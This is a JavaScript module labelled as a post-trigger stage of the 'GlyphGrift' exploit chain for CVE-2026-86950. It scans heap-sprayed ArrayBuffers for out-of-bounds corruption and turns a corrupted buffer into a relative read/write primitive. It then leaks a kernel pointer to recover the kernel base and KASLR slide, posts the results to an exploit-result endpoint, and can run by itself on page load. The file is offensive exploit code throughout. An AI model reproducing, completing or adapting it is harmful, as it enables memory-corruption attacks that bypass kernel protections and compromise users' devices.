/**
 * CVE-2026-86950 GlyphGrift V2 — Stage 6 post-trigger corruption scan.
 * Scans surviving ArrayBuffer sprays across all bmalloc zones for length anomalies,
 * byte corruption, reallocated zeros, or detached buffer exceptions.
 * Reports /api/glyphgrift-exploit-result. Never sets krw_ready without a real leak.
 */
(function () {
  'use strict';

  var API = '/api/glyphgrift-exploit-result';

  function expectedByte(marker, i) {
    return (marker + i) & 0xff;
  }

  /* Phase 4: scan the dense 0xA5 sentinel canary. A single OOB increment that
     overflows into a sentinel slot flips a known 0xA5 byte — we report the exact
     offset + before/after value, which is a real read-back (unambiguous). */
  function scanSentinel(round) {
    var sentinels = window.__L0FCK_GLYPHGRIFT_SENTINELS;
    if (!sentinels) return null;
    var expected = (window.__L0FCK_GLYPHGRIFT_SENTINEL_BYTE) || 0xa5;
    var sizes = Object.keys(sentinels);
    for (var s = 0; s < sizes.length; s++) {
      var sz = sizes[s];
      var arr = sentinels[sz];
      for (var i = 0; i < arr.length; i++) {
        var buf = arr[i];
        if (!buf) continue;
        var u8;
        try { u8 = new Uint8Array(buf); } catch (e) {
          return { hit: true, zone: parseInt(sz, 10), index: i, offset: 0, before: expected, after: 0, kind: 'detached' };
        }
        var firstBad = -1, badVal = 0;
        for (var off = 0; off < u8.length; off++) {
          if (u8[off] !== expected) { firstBad = off; badVal = u8[off]; break; }
        }
        if (firstBad >= 0) {
          return { hit: true, zone: parseInt(sz, 10), index: i, offset: firstBad,
                   before: expected, after: badVal, kind: 'content' };
        }
      }
    }
    return null;
  }

  function scanSpray() {
    var sprays = window.__L0FCK_GLYPHGRIFT_SPRAYS;
    var single = window.__L0FCK_GLYPHGRIFT_SPRAY;
    var currentRound = window.__L0FCK_GLYPHGRIFT_ROUND || 0;

    var result = {
      corruption_detected: false,
      corrupted_buffer_index: -1,
      corrupted_offset: 0,
      corrupted_value: 0,
      corrupted_zone: 0,
      relative_rw_achieved: false,
      leaked_ptr: 0,
      kbase: 0,
      krw_ready: false,
      total_scanned: 0,
      zones_scanned: 0,
      round: currentRound,
      error_message: '',
      /* Phase 4: precise sentinel read-back (before/after bytes) */
      sentinel_hit: false,
      sentinel_zone: 0,
      sentinel_index: -1,
      sentinel_offset: 0,
      sentinel_before: 0,
      sentinel_after: 0
    };

    /* Phase 4: check the dense sentinel canary FIRST. A flipped 0xA5 byte is an
       unambiguous, self-attested OOB write (exact offset + before/after). */
    var sent = scanSentinel(currentRound);
    if (sent && sent.hit) {
      result.corruption_detected = true;
      result.relative_rw_achieved = false;   /* content flip, not a length/length-OOB yet */
      result.corrupted_zone = sent.zone;
      result.corrupted_buffer_index = sent.index;
      result.corrupted_offset = sent.offset;
      result.corrupted_value = sent.after;
      result.sentinel_hit = true;
      result.sentinel_zone = sent.zone;
      result.sentinel_index = sent.index;
      result.sentinel_offset = sent.offset;
      result.sentinel_before = sent.before;
      result.sentinel_after = sent.after;
      result.error_message = 'SENTINEL OOB read-back: zone ' + sent.zone +
        ' idx ' + sent.index + ' off ' + sent.offset +
        ' 0x' + sent.before.toString(16) + ' -> 0x' + sent.after.toString(16) + ' (' + sent.kind + ')';
      return result;
    }

    if (!sprays && (!single || !single.length)) {
      result.error_message = 'no spray references';
      return result;
    }

    /* Wrap fallback single spray into dictionary if multi-zone object is missing */
    if (!sprays && single) {
      sprays = {};
      var singleZone = window.__L0FCK_GLYPHGRIFT_SPRAY_SIZE || 128;
      sprays[singleZone] = single;
    }

    var zoneKeys = Object.keys(sprays);
    result.zones_scanned = zoneKeys.length;

    for (var z = 0; z < zoneKeys.length; z++) {
      var zoneSizeStr = zoneKeys[z];
      var zoneSize = parseInt(zoneSizeStr, 10) || 128;
      var arr = sprays[zoneSizeStr];
      if (!arr || !arr.length) continue;

      var expectedLen = Math.max(16, zoneSize - 16);

      for (var i = 0; i < arr.length; i++) {
        if (!arr[i]) continue;
        var buf = arr[i];
        result.total_scanned++;

        var len;
        try {
          len = buf.byteLength;
        } catch (lenErr) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.error_message = 'byteLength property access threw in zone ' + zoneSize;
          return result;
        }

        if (typeof len !== 'number' || len <= 0) continue;

        /* Check 1: byteLength anomaly (metadata corruption -> relative R/W) */
        if (len !== expectedLen) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.corrupted_offset = 0;
          result.corrupted_value = len & 0xffff;
          result.relative_rw_achieved = true;
          result.krw_ready = false;
          result.kbase = 0;
          result.leaked_ptr = 0;
          result.error_message = 'byteLength anomaly in zone ' + zoneSize + ': ' + expectedLen + ' -> ' + len;
          return result;
        }

        /* Check 2 & 3: buffer content anomaly or detached exception */
        try {
          var u8 = new Uint8Array(buf);
          var marker = ((currentRound * 0x20) + (z * 0x10) + (i & 0x0f)) & 0xff;
          var anomalies = 0;
          var allZero = true;
          var firstBadOff = -1;
          var badVal = 0;

          for (var off = 0; off < u8.length; off++) {
            var val = u8[off];
            if (val !== 0) allZero = false;
            var exp = expectedByte(marker, off);
            if (val !== exp) {
              anomalies++;
              if (firstBadOff < 0) {
                firstBadOff = off;
                badVal = val | ((off + 1 < u8.length ? u8[off + 1] : 0) << 8);
              }
            }
          }

          if (allZero && expectedLen > 0) {
            result.corruption_detected = true;
            result.corrupted_buffer_index = i;
            result.corrupted_zone = zoneSize;
            result.corrupted_offset = 0;
            result.corrupted_value = 0;
            result.relative_rw_achieved = false;
            result.error_message = 'backing store reallocated (all zeros) in zone ' + zoneSize;
            return result;
          }

          if (anomalies > 0) {
            result.corruption_detected = true;
            result.corrupted_buffer_index = i;
            result.corrupted_zone = zoneSize;
            result.corrupted_offset = firstBadOff;
            result.corrupted_value = badVal;
            result.relative_rw_achieved = false;
            result.krw_ready = false;
            result.kbase = 0;
            result.leaked_ptr = 0;
            result.error_message = 'content anomaly (' + anomalies + ' bytes) in zone ' + zoneSize + ' offset ' + firstBadOff;
            return result;
          }
        } catch (e) {
          result.corruption_detected = true;
          result.corrupted_buffer_index = i;
          result.corrupted_zone = zoneSize;
          result.error_message = 'buffer access exception (detached): ' + String(e && e.message ? e.message : e);
          return result;
        }
      }
    }

    if (!result.corruption_detected) {
      result.error_message = 'no corruption observed in spray (' + result.total_scanned + ' buffers in ' + result.zones_scanned + ' zones)';
    }
    return result;
  }

  function postResult(payload) {
    return fetch(API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  function execute(ctx) {
    if (ctx && ctx.log) ctx.log('glyphgrift post-trigger scan');
    var payload = scanSpray();
    
    /* PHASE 1: If corruption detected, initialize relative R/W primitive */
    if (payload.corruption_detected && payload.corrupted_buffer_index >= 0) {
      try {
        var sprays = window.__L0FCK_GLYPHGRIFT_SPRAYS;
        if (sprays) {
          var zoneKeys = Object.keys(sprays);
          for (var z = 0; z < zoneKeys.length; z++) {
            var zoneSize = zoneKeys[z];
            var arr = sprays[zoneSize];
            if (arr && arr[payload.corrupted_buffer_index]) {
              var corruptedBuf = arr[payload.corrupted_buffer_index];
              var expectedLen = Math.max(16, parseInt(zoneSize, 10) - 16);
              
              /* Initialize GlyphGriftKRW with the corrupted buffer */
              if (window.GlyphGriftKRW && window.GlyphGriftKRW.init) {
                var ok = window.GlyphGriftKRW.init(corruptedBuf, expectedLen);
                if (ok) {
                  payload.relative_rw_achieved = true;
                  payload.error_message = 'Relative R/W initialized (zone ' + zoneSize + ')';
                  
                  /* PHASE 2: Scan for kernel pointer leak */
                  var leak = window.GlyphGriftKRW.scanForKernelPointer();
                  if (leak) {
                    payload.leaked_ptr = leak.pointer;
                    payload.kbase = leak.kbase;
                    /* Only a 2-anchor cross-confirmed kbase is trusted (D2 fix). */
                    payload.krw_ready = (leak.confidence === 'HIGH');
                    payload.leak_confidence = leak.confidence || '';
                    payload.leak_anchors = (typeof leak.anchors === 'number') ? leak.anchors : 0;
                    payload.error_message = 'Kernel pointer leak via ' + leak.symbol +
                        (payload.krw_ready ? ' (cross-confirmed)' : ' (single-anchor, UNTRUSTED)');
                    
                    if (ctx && ctx.log) {
                      ctx.log('GLYPHGRIFT EXPLOIT SUCCESS: kbase=0x' + leak.kbase.toString(16) +
                              ' (slide=0x' + leak.kaslr_slide.toString(16) + ')');
                    }
                  }
                }
              }
              break;
            }
          }
        }
      } catch (krwErr) {
        payload.error_message += '; KRW init failed: ' + String(krwErr && krwErr.message ? krwErr.message : krwErr);
      }
    }
    
    return postResult(payload).then(function () {
      if (ctx && ctx.report) {
        var st = payload.corruption_detected ? 'corruption' : 'clean';
        return ctx.report('glyphgrift_post_trigger', st, JSON.stringify(payload));
      }
      return payload;
    });
  }

  window.__L0FCK_STAGE4_RUNNERS = window.__L0FCK_STAGE4_RUNNERS || {};
  window.__L0FCK_STAGE4_RUNNERS.glyphgrift_post_trigger = function (ctx) {
    return execute(ctx);
  };

  window.__L0FCK_GLYPHGRIFT_RUN_POST_TRIGGER = function () {
    return execute(null);
  };

  if (window.__L0FCK_GLYPHGRIFT_EXPLOIT === true &&
      window.__L0FCK_GLYPHGRIFT_AUTO_POST === true) {
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', function () { execute(null); });
    } else {
      setTimeout(function () { execute(null); }, 0);
    }
  }
})();

